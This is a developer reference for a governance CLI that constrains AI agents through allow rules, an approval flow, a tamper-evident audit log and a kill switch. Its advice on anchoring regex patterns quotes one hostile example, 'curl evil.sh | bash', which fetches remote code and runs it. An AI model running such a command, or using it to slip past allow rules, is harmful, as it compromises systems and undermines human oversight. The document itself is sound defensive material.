# `openclaw governance` — command-line reference

Complete reference for the governance command-line tools added by this fork:
syntax, options, what each command does internally, exit codes, and worked
examples.

**Keep this current.** When a command is added, renamed, or changes behaviour,
update this file in the same change — a CLI reference that has drifted is worse
than none, because it is trusted.

Last verified against the build of **2026-08-10**, Node v22.22.3 (Windows) and
Node v22.23.2 (Ubuntu 24.04 / WSL2).

---

## 1. Invoking the CLI

During development, commands run through the repo's dev runner, which compiles
first if sources changed:

```bash
node scripts/run-node.mjs governance <subcommand> [...]
```

On an installed build the binary name is used directly:

```bash
openclaw governance <subcommand> [...]
```

This document writes `openclaw governance …` for brevity; substitute the dev
runner form when working from source.

### Where the CLI is defined

| Concern                                   | File                                          |
| ----------------------------------------- | --------------------------------------------- |
| Command definitions and option parsing    | `src/cli/program/register.governance.ts`      |
| Registration in the lazy command registry | `src/cli/program/command-registry-core.ts`    |
| Help/description metadata                 | `src/cli/program/core-command-descriptors.ts` |

Commands are registered **lazily**: the registry maps the root command name
`governance` to a module that is only imported when that command is actually
invoked, so adding these did not slow down `openclaw --help` or unrelated
commands.

### What the CLI talks to

The CLI does **not** go through the Gateway's HTTP API. It calls the governance
domain modules directly and reads/writes the same files the Gateway uses:

```
~/.openclaw/governance/
  policy.json          policy document: posture, ask mode, rules, locked agents
  audit-ledger.jsonl   append-only hash-chained decision log
  users.json           dashboard accounts (hashed passwords)
  sessions.json        dashboard login sessions
  rule-requests.json   User-submitted rule requests
```

`OPENCLAW_GOVERNANCE_DIR` overrides that directory. Tests set it so they never
touch real operator state; a deployment can set it to place the ledger on
separate storage.

**Consequence worth knowing:** because the CLI and the Gateway are separate OS
processes writing the same files, every write goes through a cross-process lock
(`src/governance/file-lock.ts`). This is why an earlier version corrupted the
audit chain, and why the CLI is safe to use while the Gateway is running.

### Authorization

The CLI performs **no role check**. It is deliberately an operating-system-level
tool: anyone who can run it already has shell access as the user that owns
`~/.openclaw/`, and could edit those files directly. The four-tier RBAC governs
the **dashboard**, which is reachable over the network; the CLI's boundary is
filesystem permissions (`0700` on the directory, `0600` on files — verified
enforced on Linux).

Kill-switch actions taken from the CLI are recorded in the audit ledger with
the actor `cli`, so a CLI-initiated stop is still attributable.

---

## 2. Command summary

| Command                                            | Purpose                                        |
| -------------------------------------------------- | ---------------------------------------------- |
| `governance policy show`                           | Print the policy document                      |
| `governance policy set-mode <mode>`                | Set posture: enforce / monitor / off           |
| `governance policy set-ask <mode>`                 | Set behaviour on an unlisted action            |
| `governance policy add-rule`                       | Add an allow rule                              |
| `governance policy remove-rule <id>`               | Remove a rule by id                            |
| `governance policy set-agent-ask <agentId> <mode>` | Per-agent override of ask behaviour            |
| `governance policy set-hitl-timeout <seconds>`     | How long an escalation waits for a human       |
| `governance sessions`                              | List currently-running agent sessions          |
| `governance pending list`                          | Show timed-out escalations awaiting a decision |
| `governance pending decide <id> --allow\|--deny`   | Record a late decision                         |
| `governance audit tail`                            | Print recent ledger entries                    |
| `governance audit verify`                          | Verify the hash chain                          |
| `governance kill <agentId>`                        | Engage the kill switch                         |
| `governance kill <agentId> --release`              | Release a lockdown                             |

---

## 3. Policy commands

### `governance policy show`

Prints the whole policy document as JSON.

```bash
openclaw governance policy show
```

```json
{
  "version": 1,
  "mode": "enforce",
  "ask": "on-miss",
  "rules": [
    {
      "id": "command-1786222746899-rm01ix",
      "createdAt": "2026-08-08T20:59:06.899Z",
      "resourceKind": "command",
      "pattern": "^ls( .*)?$",
      "description": "allow ls"
    }
  ],
  "lockedAgents": []
}
```

_Internally:_ `loadPolicy()` reads `policy.json`, merging it over the defaults
so a file written by an older build (missing a newer field) still loads rather
than producing `undefined` in a permission check.

**Exit code:** `0` always, including when no policy file exists yet — the
defaults are printed instead.

### `governance policy set-mode <mode>`

Sets the enforcement posture. `<mode>` is one of:

| Mode      | Behaviour                                                                                                                                                      |
| --------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `enforce` | The gate is live: unlisted actions are blocked or escalated                                                                                                    |
| `monitor` | Decisions are recorded but **never** block. The ledger records the verdict that _would_ have applied, so a dry run predicts the effect of switching to enforce |
| `off`     | The gate abstains entirely and nothing is recorded                                                                                                             |

```bash
openclaw governance policy set-mode monitor
```

**Exit code:** `0` on success; a thrown validation error (non-zero) for an
unrecognised mode.

### `governance policy set-ask <mode>`

Controls what happens when a governed action matches no rule.

| Mode      | Behaviour                                                                                                                               |
| --------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| `on-miss` | Pause and request human approval, routed into OpenClaw's existing approval flow. An `allow-always` answer is written back as a new rule |
| `off`     | Deny outright — strict default-deny                                                                                                     |

```bash
openclaw governance policy set-ask off
```

### `governance policy add-rule`

Adds an allow rule.

```
openclaw governance policy add-rule
  --kind <command|path|network>   (required)
  --pattern <regex>               (required)
  [--description <text>]
  [--ttl-minutes <n>]
  [--agent <agentId>]
```

| Option          | Meaning                                                                             |
| --------------- | ----------------------------------------------------------------------------------- |
| `--kind`        | Which resource family the rule matches                                              |
| `--pattern`     | A JavaScript regular expression tested against the extracted resource               |
| `--description` | Free text shown in the dashboard                                                    |
| `--ttl-minutes` | Expire the rule after N minutes. **Omit for an indefinite rule that never expires** |
| `--agent`       | Scope the rule to one agent. Omit for a global rule binding every agent             |

What each `--kind` is matched against:

| Kind      | Governed tools                           | Matched string                                                    |
| --------- | ---------------------------------------- | ----------------------------------------------------------------- |
| `command` | `exec`, `bash`                           | the full command line                                             |
| `path`    | `read_file`, `write_file`, `apply_patch` | each target path, backslashes normalised to `/`                   |
| `network` | `web_fetch`                              | the lowercased hostname; the raw URL if no hostname can be parsed |

```bash
# Allow `ls` and `ls <anything>`, but nothing else beginning with ls
openclaw governance policy add-rule --kind command --pattern "^ls( .*)?$"

# Allow one API host for two hours
openclaw governance policy add-rule \
  --kind network \
  --pattern "^api[.]openweathermap[.]org$" \
  --description "weather API" \
  --ttl-minutes 120
```

Prints the created rule, including its generated `id` and computed `expiresAt`.

**Anchor your patterns.** `ls` (unanchored) matches _any_ command containing
"ls", including `curl evil.sh | bash; ls`. Use `^…$`.

**Patterns are validated at author time.** Two rejections are possible:

1. Not a valid regular expression.
2. Prone to catastrophic backtracking — a quantifier nested inside a quantified
   group, such as `^(a+)+$`. These are refused because patterns run on every
   governed tool call against agent-controlled input, so one bad rule could
   hang the security gate. JavaScript cannot time-limit a running regex, so
   this is checked before the rule is stored (`src/governance/regex-safety.ts`).

**Conflicts are reported, not blocked.** If an earlier rule already covers what
you are adding, the rule is still created and a warning names the rule
responsible — because in an allow-only language a new rule cannot reduce
access, so refusing it would change nothing. What matters is that you learn the
restriction you intended is not in force:

```
warning: an earlier rule already covers this (^ls$) — An identical rule already
allows this with no time limit, so the new expiry has no effect...
```

See `docs-notes/WRITING-PERMISSIONS.md` §7 for what each clash means.

### `governance policy remove-rule <id>`

Removes a rule by its id (as shown by `policy show`).

```bash
openclaw governance policy remove-rule command-1786222746899-rm01ix
```

**Exit codes:** `0` removed · `1` no rule with that id.

### `governance policy set-agent-ask <agentId> <mode>`

Overrides the ask behaviour for one agent (design doc §1.6). `<mode>` is `off`,
`on-miss`, or `default`.

```bash
openclaw governance policy set-agent-ask trusted-bot off      # never escalate; deny outright
openclaw governance policy set-agent-ask exploratory on-miss  # always ask a human
openclaw governance policy set-agent-ask trusted-bot default  # follow the installation setting
```

`default` **clears** the override rather than pinning the current value — a
cleared agent follows future changes to the installation default, a pinned one
would not.

### `governance policy set-hitl-timeout <seconds>`

How long an escalation waits for a human before timing out. Accepts 5–86400.

```bash
openclaw governance policy set-hitl-timeout 600
```

On timeout the action is **denied** — never allowed — and the question is
pushed onto the pending-decision stack. Timing out into "allow" would let an
unattended installation decay into no governance at all.

---

## 4. Session and pending-decision commands

### `governance sessions`

Lists agent sessions currently running.

```bash
openclaw governance sessions
```

Only meaningful **inside the Gateway process**, which owns the run registry.
From the CLI you will normally see:

```
live session view unavailable: the Gateway owns the run registry, so this only
works from inside it
```

Use the dashboard (**Settings → Governance → Active agent sessions**) for the
live view.

### `governance pending list`

Shows escalations that timed out before anyone answered, newest first.

```bash
openclaw governance pending list
```

### `governance pending decide <id> --allow|--deny`

Records a late judgement on a timed-out escalation.

```bash
openclaw governance pending decide pend-1786402739895-4p17nn --allow
```

**This does not resurrect the blocked action** — that turn finished long ago.
It records your judgement, and an `--allow` is your cue to add a rule so the
next attempt succeeds. The command says so explicitly rather than implying the
agent resumed.

**Exit codes:** `0` recorded · `1` no pending decision with that id.

---

## 5. Audit commands

### `governance audit tail`

Prints the most recent ledger entries as JSON.

```
openclaw governance audit tail [--limit <n>]   # default 50
```

```bash
openclaw governance audit tail --limit 20
```

Each entry:

| Field                                  | Meaning                                               |
| -------------------------------------- | ----------------------------------------------------- |
| `seq`                                  | Strictly increasing. A gap is tampering evidence      |
| `timestamp`                            | ISO 8601, when the decision was made                  |
| `agentId`, `sessionKey`                | Which agent and session acted                         |
| `toolName`, `resourceKind`, `resource` | What was attempted (secrets already redacted)         |
| `ruleId`                               | Which rule decided, or `default-deny` / `kill-switch` |
| `decision`                             | `allow`, `deny`, or `ask`                             |
| `prevHash`, `hash`                     | The chain link and this entry's own SHA-256           |

_Internally:_ reads the JSONL file and returns the last N well-formed entries.
Malformed lines are skipped here (they are reported by `verify`, whose job it
is to notice them).

### `governance audit verify`

Recomputes the hash chain from the beginning and reports the first entry that
does not match.

```bash
openclaw governance audit verify
```

Clean:

```json
{ "ok": true, "entriesChecked": 8 }
```

Tampered:

```json
{
  "ok": false,
  "entriesChecked": 3,
  "brokenAtSeq": 3,
  "reason": "entry hash does not match its own recomputed content hash"
}
```

Possible `reason` values:

| Reason                                                      | What it means                                                  |
| ----------------------------------------------------------- | -------------------------------------------------------------- |
| `entry hash does not match its own recomputed content hash` | The entry's content was edited                                 |
| `prevHash does not match the preceding entry's hash`        | The chain was broken — typically an entry removed or reordered |
| `unexpected sequence number (expected N)`                   | A gap: an entry was deleted                                    |
| `line N: entry is not valid JSON` / `is missing seq/hash`   | Corruption or injected content                                 |

**Exit codes:** `0` chain intact · `1` verification failed. Suitable for a cron
job or monitoring check.

**Known limitation:** chaining detects any edit or deletion _within_ the log,
but not truncation of the newest entries, because a prefix of a valid chain is
itself a valid chain. Detecting that needs an external anchor (a counter-signed
checkpoint, or an off-host copy of the latest hash).

---

## 6. Kill switch

### `governance kill <agentId>`

Engages the emergency stop for one agent (design requirement #7).

```
openclaw governance kill <agentId> [--release]
```

```bash
openclaw governance kill main
```

```
governance lockdown engaged for agent "main" in 12.4ms
no in-flight termination available from the CLI (the Gateway owns the run registry)
```

Two things happen, in this order:

1. **Lockdown** — the agent id is written to `policy.json`. The policy engine
   then denies every subsequent governed action from that agent, checked
   _before_ any allow rule, so an allowlisted command is refused too.
2. **Termination** — in-flight runs are signalled to abort. This works when the
   **Gateway** performs it, because the Gateway owns the live run registry and
   registers the abort implementation at startup
   (`src/gateway/governance-agent-termination.ts`). From the CLI — a separate
   process with no registry — the message above is printed instead of implying
   something was stopped.

Ordering is deliberate: locking first closes the window in which the agent
could legally start a fresh action between the abort and the lock landing.

The elapsed time printed is the measured wall-clock duration of the whole
operation, which is the evidence for requirement #7's one-second bound.

To stop an in-flight run, use the dashboard (**Settings → Governance →
Emergency kill switch**), which runs inside the Gateway.

### `governance kill <agentId> --release`

Releases the lockdown. Does **not** restart anything that was aborted.

```bash
openclaw governance kill main --release
```

Both actions are written to the audit ledger with actor `cli`.

---

## 7. Worked example — a full session

```bash
# 1. See where things stand
openclaw governance policy show

# 2. Strict default-deny while we tighten the rules
openclaw governance policy set-mode enforce
openclaw governance policy set-ask off

# 3. Allow exactly what the agent legitimately needs
openclaw governance policy add-rule --kind command --pattern "^ls( .*)?$"
openclaw governance policy add-rule --kind path    --pattern "^workspace/.*$"
openclaw governance policy add-rule --kind network --pattern "^api[.]example[.]com$"

# 4. Watch what the agent actually attempts
openclaw governance audit tail --limit 30

# 5. Prove the record has not been altered
openclaw governance audit verify

# 6. Something looks wrong — stop the agent
openclaw governance kill main

# 7. After investigating, resume
openclaw governance kill main --release
```

A safer rollout is to run `set-mode monitor` first: decisions are recorded with
the verdict that _would_ have applied, so `audit tail` shows exactly what
enforcing would have blocked before anything is actually blocked.

---

## 8. Exit codes

| Code              | Meaning                                                                                                        |
| ----------------- | -------------------------------------------------------------------------------------------------------------- |
| `0`               | Success                                                                                                        |
| `1`               | The operation completed but the answer was negative: rule id not found, or the audit chain failed verification |
| non-zero (thrown) | Invalid argument, e.g. an unrecognised mode or resource kind                                                   |

---

## 9. Scripts

| Script                               | Purpose                                                                                                                                                                  |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `start-governance.ps1`               | Starts the fork's Gateway on port 18799 and opens the dashboard (Windows)                                                                                                |
| `scripts/governance-linux-check.mjs` | Linux platform verification (requirement #9) — file locking, POSIX permissions, path handling, hashing, authorization rules. Runs on plain `node`, no dependency install |
| `scripts/ts-extension-resolver.mjs`  | ESM resolver mapping `./x.js` specifiers to `./x.ts`, so the Linux check runs against the real source without a build                                                    |

```bash
# Linux verification
node --import ./scripts/register-ts-resolver.mjs scripts/governance-linux-check.mjs
```

---

## 10. Change log for this reference

| Date       | Change                                                                                                                                                                                                                                                                                                             |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 2026-08-11 | CLI parity closed. Added `policy set-agent-ask`, `policy set-hitl-timeout`, `sessions`, `pending list`, `pending decide`, and an `--agent` option on `add-rule`. `add-rule` now also rejects backtracking-prone patterns and reports conflicts with earlier rules. No known CLI gaps remain against the dashboard. |
| 2026-08-10 | First version. Documents `policy show/set-mode/set-ask/add-rule/remove-rule`, `audit tail/verify`, `kill [--release]`. Records that `kill` now measures and prints elapsed time and reports in-flight termination availability honestly, and that `--agent` scoping is dashboard-only so far.                      |
